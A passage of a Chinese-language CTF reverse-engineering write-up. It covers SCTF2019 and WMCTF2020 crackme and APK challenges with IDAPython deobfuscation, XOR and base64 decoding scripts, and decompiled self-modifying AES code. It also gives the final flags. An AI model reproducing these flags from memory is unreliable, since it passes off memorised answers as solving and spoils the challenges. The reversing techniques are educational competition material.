class="number">203</span>,<span class="number">8</span>,<span class="number">195</span>,<span class="number">228</span>,<span class="number">73</span>,<span class="number">90</span>,<span class="number">99</span>,<span class="number">12</span>,<span class="number">223</span>,<span class="number">246</span>,<span class="number">95</span>,<span class="number">8</span>,<span class="number">40</span>,<span class="number">189</span>,<span class="number">226</span>,<span class="number">16</span>,<span class="number">21</span>,<span class="number">31</span>,<span class="number">110</span>,<span class="number">170</span>,<span class="number">90</span>,<span class="number">202</span>,<span class="number">236</span>,<span class="number">128</span>,<span class="number">175</span>]</span><br><span class="line"></span><br><span class="line">flag = <span class="string">b&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i,j <span class="keyword">in</span> <span class="built_in">zip</span>(plain, xor_data):</span><br><span class="line">    flag += <span class="built_in">bytes</span>([i ^ j])</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><h3 id="SCTF2019-babyre"><a href="#SCTF2019-babyre" class="headerlink" title="[SCTF2019]babyre"></a>[SCTF2019]babyre</h3><p>存在花指令，用idapython去花</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">bg = <span class="number">0x0000000000000798</span></span><br><span class="line">end = <span class="number">0X000000000000F66</span></span><br><span class="line">addr = bg</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">patch_nop</span>(<span class="params">begin, end</span>):</span></span><br><span class="line">    <span class="keyword">while</span>(end&gt;begin):</span><br><span class="line">        patch_byte(begin, <span class="number">0x90</span>)</span><br><span class="line">        begin=begin+<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">next_instr</span>(<span class="params">addr</span>):</span></span><br><span class="line">    <span class="keyword">return</span> addr+get_item_size(addr)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(addr&lt;end):</span><br><span class="line">    <span class="built_in">next</span> =next_instr(addr)</span><br><span class="line">    create_insn(<span class="built_in">next</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;j&#x27;</span> <span class="keyword">in</span> print_insn_mnem(addr) <span class="keyword">and</span> <span class="string">&#x27;j&#x27;</span> <span class="keyword">in</span> print_insn_mnem(<span class="built_in">next</span>) :</span><br><span class="line">        <span class="keyword">if</span> get_operand_value(addr, <span class="number">0</span>) == get_operand_value(<span class="built_in">next</span>, <span class="number">0</span>):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;jmp %08x&#x27;</span>%addr)</span><br><span class="line">            dest_addr = get_operand_value(addr, <span class="number">0</span>)</span><br><span class="line">            patch_nop(addr, dest_addr)</span><br><span class="line">            addr=dest_addr</span><br><span class="line">            create_insn(addr)</span><br><span class="line">    addr = next_instr(addr)</span><br><span class="line">    create_insn(addr)</span><br></pre></td></tr></table></figure><p>存在三关，第一关为三维迷宫 5 * 5 *5</p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211011151419248.png" alt="image-20211011151419248"></p><p>用python打出来手走一遍</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">data = [<span class="number">0x2A</span>, <span class="number">0x2A</span>, <span class="number">0x2A</span>, <span class="number">0x2A</span>, <span class="number">0x2A</span>, <span class="number">0x2A</span>, <span class="number">0x2A</span>, <span class="number">0x2A</span>, <span class="number">0x2A</span>, <span class="number">0x2A</span>, <span class="number">0x2A</span>, <span class="number">0x2A</span>, <span class="number">0x2A</span>, <span class="number">0x2A</span>, <span class="number">0x2E</span>, <span class="number">0x2A</span>, <span class="number">0x2A</span>, <span class="number">0x2A</span>, <span class="number">0x2A</span>, <span class="number">0x2E</span>, <span class="number">0x2A</span>, <span class="number">0x2A</span>, <span class="number">0x73</span>, <span class="number">0x2E</span>, <span class="number">0x2E</span>, <span class="number">0x2A</span>, <span class="number">0x2E</span>, <span class="number">0x2E</span>, <span class="number">0x2A</span>, <span class="number">0x2A</span>, <span class="number">0x2A</span>, <span class="number">0x2A</span>, <span class="number">0x2A</span>, <span class="number">0x2A</span>, <span class="number">0x2E</span>, <span class="number">0x2A</span>, <span class="number">0x2A</span>, <span class="number">0x2A</span>, <span class="number">0x2A</span>, <span class="number">0x2E</span>, <span class="number">0x2A</span>, <span class="number">0x2A</span>, <span class="number">0x2A</span>, <span class="number">0x2A</span>, <span class="number">0x2A</span>, <span class="number">0x2A</span>, <span class="number">0x2A</span>, <span class="number">0x2A</span>, <span class="number">0x2A</span>, <span class="number">0x2A</span>, <span class="number">0x2A</span>, <span class="number">0x2E</span>, <span class="number">0x2E</span>, <span class="number">0x2A</span>, <span class="number">0x2A</span>, <span class="number">0x2A</span>, <span class="number">0x2E</span>, <span class="number">0x2E</span>, <span class="number">0x2A</span>, <span class="number">0x2A</span>, <span class="number">0x2E</span>, <span class="number">0x2E</span>, <span class="number">0x23</span>, <span class="number">0x2A</span>, <span class="number">0x2E</span>, <span class="number">0x2E</span>, <span class="number">0x2A</span>, <span class="number">0x2A</span>, <span class="number">0x2A</span>, <span class="number">0x2E</span>, <span class="number">0x2E</span>, <span class="number">0x2A</span>, <span class="number">0x2A</span>, <span class="number">0x2A</span>, <span class="number">0x2E</span>, <span class="number">0x2A</span>, <span class="number">0x2A</span>, <span class="number">0x2A</span>, <span class="number">0x2A</span>, <span class="number">0x2A</span>, <span class="number">0x2A</span>, <span class="number">0x2A</span>, <span class="number">0x2A</span>, <span class="number">0x2A</span>, <span class="number">0x2A</span>, <span class="number">0x2A</span>, <span class="number">0x2A</span>, <span class="number">0x2A</span>, <span class="number">0x2A</span>, <span class="number">0x2A</span>, <span class="number">0x2A</span>, <span class="number">0x2A</span>, <span class="number">0x2A</span>, <span class="number">0x2A</span>, <span class="number">0x2A</span>, <span class="number">0x2E</span>, <span class="number">0x2A</span>, <span class="number">0x2A</span>, <span class="number">0x2E</span>, <span class="number">0x2E</span>, <span class="number">0x2A</span>, <span class="number">0x2A</span>, <span class="number">0x2A</span>, <span class="number">0x2A</span>, <span class="number">0x2A</span>, <span class="number">0x2A</span>, <span class="number">0x2A</span>, <span class="number">0x2E</span>, <span class="number">0x2E</span>, <span class="number">0x2A</span>, <span class="number">0x2A</span>, <span class="number">0x2E</span>, <span class="number">0x2E</span>, <span class="number">0x2E</span>, <span class="number">0x2A</span>, <span class="number">0x2E</span>, <span class="number">0x2E</span>, <span class="number">0x2A</span>, <span class="number">0x2E</span>, <span class="number">0x2A</span>, <span class="number">0x2E</span>, <span class="number">0x2A</span>, <span class="number">0x2A</span>, <span class="number">0x2E</span>, <span class="number">0x2A</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">        maze = <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">            maze += <span class="built_in">chr</span>(data[i*<span class="number">25</span> + j*<span class="number">5</span>+k])</span><br><span class="line">        <span class="built_in">print</span>(maze)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;================&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># path = b&quot;ddwwxxssxaxwwaasasyywwdd&quot;</span></span><br></pre></td></tr></table></figure><p>第二关，一个编码函数，编码后等于<code>sctf_9102</code></p><p>实际上就是base64</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">plain = <span class="string">b&quot;sctf_9102&quot;</span></span><br><span class="line">cipher = base64.b64encode(plain)</span><br><span class="line"><span class="built_in">print</span>(cipher)</span><br></pre></td></tr></table></figure><p>第三关，魔改SM4加密，对比数据丢进去就出了</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">fl4g_is_s0_ug1y!</span><br></pre></td></tr></table></figure><p>最终flag为: <code>ddwwxxssxaxwwaasasyywwdd-c2N0Zl85MTAy(fl4g_is_s0_ug1y!)</code></p><h3 id="WMCTF2020-easy-re"><a href="#WMCTF2020-easy-re" class="headerlink" title="[WMCTF2020]easy_re"></a>[WMCTF2020]easy_re</h3><p>通过x64dbg动态调试，f9运行，f2下断点， 通过输出<code>please input the flag:</code>来定位。</p><p>最后将perl脚本导出</p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211011213717623.png" alt="image-20211011213717623"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$flag = &quot;WMCTF&#123;I_WAnt_dynam1c_F1ag&#125;&quot;;</span><br><span class="line">print &quot;please input the flag:&quot;;</span><br><span class="line">$line = &lt;STDIN&gt;;</span><br><span class="line">chomp($line);</span><br><span class="line">if($line eq $flag)&#123;</span><br><span class="line">print &quot;congratulation!&quot;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">print &quot;no,wrong&quot;</span><br><span class="line">&#125;&quot;</span><br></pre></td></tr></table></figure><h3 id="2019红帽杯-Snake"><a href="#2019红帽杯-Snake" class="headerlink" title="[2019红帽杯]Snake"></a>[2019红帽杯]Snake</h3><p><a href="https://lantern.cool/wp-games-2019redhat/">2019 红帽杯 | Lantern’s 小站</a></p><h3 id="SCTF2019-Strange-apk"><a href="#SCTF2019-Strange-apk" class="headerlink" title="[SCTF2019]Strange apk"></a>[SCTF2019]Strange apk</h3><p>jdax打开，程序会先对一个data文件进行异或操作，解压apk在 assets 文件夹下找到  data 文件 </p><p>脚本还原</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">key = <span class="string">b&quot;syclover&quot;</span></span><br><span class="line">file_data = <span class="built_in">open</span>(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;rb&quot;</span>).read()</span><br><span class="line">new_file = <span class="built_in">open</span>(<span class="string">&quot;./mydata&quot;</span>,<span class="string">&quot;wb&quot;</span>)</span><br><span class="line">decode = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">cout = <span class="number">0</span>  </span><br><span class="line"><span class="keyword">for</span> d <span class="keyword">in</span> file_data:</span><br><span class="line">    decode += <span class="built_in">bytes</span>([d ^ key[cout % <span class="number">8</span>]])</span><br><span class="line">    cout += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;./mydata&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(decode)</span><br></pre></td></tr></table></figure><p>则可知该文件为apk文件， 丢进jadx</p><p>查看Manifest.xml可知activity为s和t函数</p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211011215947029.png" alt="image-20211011215947029"></p><h4 id="s函数"><a href="#s函数" class="headerlink" title="s函数"></a>s函数</h4><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211011220127907.png" alt="image-20211011220127907"></p><p>而f.sctf为base64</p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211011220159078.png" alt="image-20211011220159078"></p><p>解码可以得到前12位flag</p><h4 id="t函数"><a href="#t函数" class="headerlink" title="t函数"></a>t函数</h4><p>经过f.encode后等于<code>~8t808_8A8n848r808i8d8-8w808r8l8d8&#125;8</code></p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211011220600055.png" alt="image-20211011220600055"></p><p>encode如上，直接将奇数位(从0开始)去掉即可</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">s = <span class="string">b&quot;c2N0ZntXM2xjMG1l&quot;</span></span><br><span class="line">plain = base64.b64decode(s)</span><br><span class="line"><span class="comment"># print(plain)</span></span><br><span class="line"></span><br><span class="line">s = <span class="string">b&quot;~8t808_8A8n848r808i8d8-8w808r8l8d8&#125;8&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(s), <span class="number">2</span>):</span><br><span class="line">    plain += <span class="built_in">bytes</span>([s[i]])</span><br><span class="line"><span class="built_in">print</span>(plain)</span><br></pre></td></tr></table></figure><h3 id="SCTF2019-creakme"><a href="#SCTF2019-creakme" class="headerlink" title="[SCTF2019]creakme"></a>[SCTF2019]creakme</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  HMODULE ModuleHandleW; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// eax</span></span><br><span class="line">  _DWORD *v5; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v6; <span class="comment">// edx</span></span><br><span class="line">  _DWORD *v7; <span class="comment">// ecx</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v8; <span class="comment">// ebx</span></span><br><span class="line">  <span class="keyword">char</span> *v9; <span class="comment">// edi</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v10; <span class="comment">// esi</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v11; <span class="comment">// esi</span></span><br><span class="line">  <span class="keyword">bool</span> v12; <span class="comment">// cf</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 v13; <span class="comment">// al</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 v14; <span class="comment">// al</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 v15; <span class="comment">// al</span></span><br><span class="line">  <span class="keyword">int</span> v16; <span class="comment">// esi</span></span><br><span class="line">  <span class="keyword">void</span> *v17; <span class="comment">// ecx</span></span><br><span class="line">  <span class="keyword">void</span> *v18; <span class="comment">// ecx</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *v19; <span class="comment">// edx</span></span><br><span class="line">  <span class="keyword">int</span> v20; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">void</span> *Block[<span class="number">5</span>]; <span class="comment">// [esp+10h] [ebp-70h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v23; <span class="comment">// [esp+24h] [ebp-5Ch]</span></span><br><span class="line">  <span class="keyword">void</span> *v24[<span class="number">5</span>]; <span class="comment">// [esp+28h] [ebp-58h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v25; <span class="comment">// [esp+3Ch] [ebp-44h]</span></span><br><span class="line">  <span class="keyword">char</span> flag[<span class="number">48</span>]; <span class="comment">// [esp+40h] [ebp-40h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v27; <span class="comment">// [esp+7Ch] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  ModuleHandleW = GetModuleHandleW(<span class="number">0</span>);</span><br><span class="line">  SMC(ModuleHandleW);                           <span class="comment">// .SCTF 段进行SMC, 带一个反调试</span></span><br><span class="line">  call_sctf();                                  <span class="comment">// 调用SMC后的代码</span></span><br><span class="line">  v4 = sub_402870(<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">&quot;welcome to 2019 sctf&quot;</span>);</span><br><span class="line">  <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v4, sub_402AC0);</span><br><span class="line">  sub_402870(<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">&quot;please input your ticket:&quot;</span>);</span><br><span class="line">  sub_402AF0(<span class="built_in">std</span>::<span class="built_in">cin</span>, flag);</span><br><span class="line">  v24[<span class="number">4</span>] = <span class="number">0</span>;</span><br><span class="line">  v25 = <span class="number">15</span>;</span><br><span class="line">  LOBYTE(v24[<span class="number">0</span>]) = <span class="number">0</span>;</span><br><span class="line">  sub_401D30(v24, flag, <span class="built_in">strlen</span>(flag));</span><br><span class="line">  v27 = <span class="number">0</span>;</span><br><span class="line">  v5 = aes_cbc(Block, (<span class="keyword">int</span>)v24);</span><br><span class="line">  v6 = <span class="built_in">strlen</span>(aPvfqyc4ttc2uxr);</span><br><span class="line">  v7 = v5;</span><br><span class="line">  <span class="keyword">if</span> ( v5[<span class="number">5</span>] &gt;= <span class="number">0x10</span>u )</span><br><span class="line">    v7 = (_DWORD *)*v5;</span><br><span class="line">  v8 = v5[<span class="number">4</span>];</span><br><span class="line">  v9 = aPvfqyc4ttc2uxr;</span><br><span class="line">  v10 = v8;</span><br><span class="line">  <span class="keyword">if</span> ( v6 &lt; v8 )</span><br><span class="line">    v10 = v6;</span><br><span class="line">  v12 = v10 &lt; <span class="number">4</span>;</span><br><span class="line">  v11 = v10 - <span class="number">4</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v12 )</span><br><span class="line">  &#123;</span><br><span class="line">LABEL_8:</span><br><span class="line">    <span class="keyword">if</span> ( v11 == <span class="number">-4</span> )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_17;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( *v7 == *(_DWORD *)v9 )</span><br><span class="line">    &#123;</span><br><span class="line">      ++v7;</span><br><span class="line">      v9 += <span class="number">4</span>;</span><br><span class="line">      v12 = v11 &lt; <span class="number">4</span>;</span><br><span class="line">      v11 -= <span class="number">4</span>;</span><br><span class="line">      <span class="keyword">if</span> ( v12 )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_8;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  v12 = *(_BYTE *)v7 &lt; (<span class="keyword">unsigned</span> __int8)*v9;</span><br><span class="line">  <span class="keyword">if</span> ( *(_BYTE *)v7 != *v9</span><br><span class="line">    || v11 != <span class="number">-3</span></span><br><span class="line">    &amp;&amp; ((v13 = *((_BYTE *)v7 + <span class="number">1</span>), v12 = v13 &lt; (<span class="keyword">unsigned</span> __int8)v9[<span class="number">1</span>], v13 != v9[<span class="number">1</span>])</span><br><span class="line">     || v11 != <span class="number">-2</span></span><br><span class="line">     &amp;&amp; ((v14 = *((_BYTE *)v7 + <span class="number">2</span>), v12 = v14 &lt; (<span class="keyword">unsigned</span> __int8)v9[<span class="number">2</span>], v14 != v9[<span class="number">2</span>])</span><br><span class="line">      || v11 != <span class="number">-1</span> &amp;&amp; (v15 = *((_BYTE *)v7 + <span class="number">3</span>), v12 = v15 &lt; (<span class="keyword">unsigned</span> __int8)v9[<span class="number">3</span>], v15 != v9[<span class="number">3</span>]))) )</span><br><span class="line">  &#123;</span><br><span class="line">    v16 = v12 ? <span class="number">-1</span> : <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_18;</span><br><span class="line">  &#125;</span><br><span class="line">LABEL_17:</span><br><span class="line">  v16 = <span class="number">0</span>;</span><br><span class="line">LABEL_18:</span><br><span class="line">  <span class="keyword">if</span> ( !v16 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v6 &lt;= v8 )</span><br><span class="line">      v16 = v6 &lt; v8;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      v16 = <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v23 &gt;= <span class="number">0x10</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v17 = Block[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">if</span> ( v23 + <span class="number">1</span> &gt;= <span class="number">0x1000</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v17 = (<span class="keyword">void</span> *)*((_DWORD *)Block[<span class="number">0</span>] - <span class="number">1</span>);</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(Block[<span class="number">0</span>] - v17 - <span class="number">4</span>) &gt; <span class="number">0x1F</span> )</span><br><span class="line">        invalid_parameter_noinfo_noreturn();</span><br><span class="line">    &#125;</span><br><span class="line">    sub_402F05(v17);</span><br><span class="line">  &#125;</span><br><span class="line">  v27 = <span class="number">-1</span>;</span><br><span class="line">  Block[<span class="number">4</span>] = <span class="number">0</span>;</span><br><span class="line">  v23 = <span class="number">15</span>;</span><br><span class="line">  LOBYTE(Block[<span class="number">0</span>]) = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v25 &gt;= <span class="number">0x10</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v18 = v24[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">if</span> ( v25 + <span class="number">1</span> &gt;= <span class="number">0x1000</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v18 = (<span class="keyword">void</span> *)*((_DWORD *)v24[<span class="number">0</span>] - <span class="number">1</span>);</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(v24[<span class="number">0</span>] - v18 - <span class="number">4</span>) &gt; <span class="number">0x1F</span> )</span><br><span class="line">        invalid_parameter_noinfo_noreturn();</span><br><span class="line">    &#125;</span><br><span class="line">    sub_402F05(v18);</span><br><span class="line">  &#125;</span><br><span class="line">  v19 = <span class="string">&quot;Have fun!&quot;</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v16 )</span><br><span class="line">    v19 = <span class="string">&quot;A forged ticket!!&quot;</span>;</span><br><span class="line">  v20 = sub_402870(<span class="built_in">std</span>::<span class="built_in">cout</span>, v19);</span><br><span class="line">  <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v20, sub_402AC0);</span><br><span class="line">  system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>SMC后的代码主要是对对比字符串进行操作，操作如下</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">sub_404000</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> i; <span class="comment">// edx</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v1; <span class="comment">// esi</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> v4; <span class="comment">// dl</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(aPvfqyc4ttc2uxr); ++i )</span><br><span class="line">    --aPvfqyc4ttc2uxr[i];</span><br><span class="line">  v1 = <span class="number">0</span>;</span><br><span class="line">  result = <span class="built_in">strlen</span>(aPvfqyc4ttc2uxr);</span><br><span class="line">  <span class="keyword">if</span> ( (result &amp; <span class="number">0xFFFFFFFE</span>) != <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      v3 = result - v1;</span><br><span class="line">      v4 = *(_BYTE *)(v3 + <span class="number">4231191</span>);</span><br><span class="line">      *(_BYTE *)(v3 + <span class="number">4231191</span>) = aPvfqyc4ttc2uxr[v1];</span><br><span class="line">      aPvfqyc4ttc2uxr[v1++] = v4;</span><br><span class="line">      result = <span class="built_in">strlen</span>(aPvfqyc4ttc2uxr);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( v1 &lt; result &gt;&gt; <span class="number">1</span> );</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后得到<code>nKnbHsgqD3aNEB91jB3gEzAr+IklQwT1bSs3+bXpeuo=</code></p><p>接着就是一个CBC模式的AES</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> *__fastcall <span class="title">aes_cbc</span><span class="params">(<span class="keyword">void</span> *a1, <span class="keyword">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *v2; <span class="comment">// esi</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// ebx</span></span><br><span class="line">  <span class="keyword">char</span> *v4; <span class="comment">// edx</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// ecx</span></span><br><span class="line">  <span class="keyword">char</span> v6; <span class="comment">// al</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// ecx</span></span><br><span class="line">  <span class="keyword">char</span> v8; <span class="comment">// si</span></span><br><span class="line">  <span class="keyword">int</span> v9; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> *v10; <span class="comment">// edi</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v11; <span class="comment">// ecx</span></span><br><span class="line">  <span class="keyword">char</span> *v12; <span class="comment">// edi</span></span><br><span class="line">  <span class="keyword">char</span> v13; <span class="comment">// bl</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v14; <span class="comment">// ecx</span></span><br><span class="line">  <span class="keyword">char</span> *v15; <span class="comment">// esi</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 *v16; <span class="comment">// edx</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v17; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v19; <span class="comment">// [esp-10h] [ebp-4B8h]</span></span><br><span class="line">  <span class="keyword">int</span> v20; <span class="comment">// [esp-Ch] [ebp-4B4h]</span></span><br><span class="line">  <span class="keyword">int</span> v21; <span class="comment">// [esp-8h] [ebp-4B0h]</span></span><br><span class="line">  <span class="keyword">int</span> v22; <span class="comment">// [esp-4h] [ebp-4ACh]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v24; <span class="comment">// [esp+14h] [ebp-494h]</span></span><br><span class="line">  <span class="keyword">size_t</span> Size; <span class="comment">// [esp+18h] [ebp-490h]</span></span><br><span class="line">  <span class="keyword">size_t</span> Sizea; <span class="comment">// [esp+18h] [ebp-490h]</span></span><br><span class="line">  <span class="keyword">char</span> *Block; <span class="comment">// [esp+1Ch] [ebp-48Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v28; <span class="comment">// [esp+20h] [ebp-488h]</span></span><br><span class="line">  <span class="keyword">char</span> *v29; <span class="comment">// [esp+20h] [ebp-488h]</span></span><br><span class="line">  <span class="keyword">void</span> **v30; <span class="comment">// [esp+24h] [ebp-484h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> v31; <span class="comment">// [esp+28h] [ebp-480h]</span></span><br><span class="line">  <span class="keyword">int</span> v32; <span class="comment">// [esp+3ECh] [ebp-BCh]</span></span><br><span class="line">  <span class="keyword">size_t</span> v33; <span class="comment">// [esp+3F0h] [ebp-B8h]</span></span><br><span class="line">  <span class="keyword">int</span> v34; <span class="comment">// [esp+3F4h] [ebp-B4h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 v35[<span class="number">128</span>]; <span class="comment">// [esp+418h] [ebp-90h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v36; <span class="comment">// [esp+4A4h] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  v2 = (<span class="keyword">char</span> *)a2;</span><br><span class="line">  v28 = *(_DWORD *)(a2 + <span class="number">16</span>);</span><br><span class="line">  v3 = <span class="number">16</span> * ((v28 &gt;&gt; <span class="number">4</span>) + <span class="number">1</span>);</span><br><span class="line">  v24 = v3;</span><br><span class="line">  Size = v3 + <span class="number">1</span>;</span><br><span class="line">  Block = (<span class="keyword">char</span> *)unknown_libname_1(v3 + <span class="number">1</span>);</span><br><span class="line">  <span class="built_in">memset</span>(Block, <span class="number">0</span>, v3 + <span class="number">1</span>);</span><br><span class="line">  <span class="keyword">if</span> ( *((_DWORD *)v2 + <span class="number">5</span>) &gt;= <span class="number">0x10</span>u )</span><br><span class="line">    v2 = *(<span class="keyword">char</span> **)v2;</span><br><span class="line">  v4 = Block;</span><br><span class="line">  v5 = Block - v2;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    v6 = *v2++;</span><br><span class="line">    v2[v5 - <span class="number">1</span>] = v6;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v6 );</span><br><span class="line">  v7 = v28 &amp; <span class="number">0xF</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">16</span> - v7 &gt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v8 = <span class="number">16</span> - v7;</span><br><span class="line">    v9 = <span class="number">16843009</span> * (<span class="keyword">unsigned</span> __int8)(<span class="number">16</span> - v7);</span><br><span class="line">    v10 = &amp;Block[<span class="number">16</span> * (v28 &gt;&gt; <span class="number">4</span>) + v7];</span><br><span class="line">    v4 = Block;</span><br><span class="line">    v11 = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(<span class="number">16</span> - v7) &gt;&gt; <span class="number">2</span>;</span><br><span class="line">    memset32(v10, v9, v11);</span><br><span class="line">    <span class="built_in">memset</span>(&amp;v10[<span class="number">4</span> * v11], v9, v8 &amp; <span class="number">3</span>);</span><br><span class="line">  